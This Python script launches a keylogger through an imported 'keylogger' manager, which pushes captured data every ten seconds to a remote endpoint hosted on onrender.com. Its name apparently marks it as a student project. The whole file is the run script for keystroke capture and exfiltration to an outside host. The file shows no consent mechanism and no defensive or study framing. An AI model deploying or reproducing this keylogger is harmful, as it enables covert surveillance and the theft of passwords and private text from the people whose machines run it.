import logging
from keylogger.manager import DefaultManager as manager

logger = logging.getLogger(__name__)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    manager(
        endpoint="https://loggerstudentproject.onrender.com",
        push_interval=10,
    ).run()
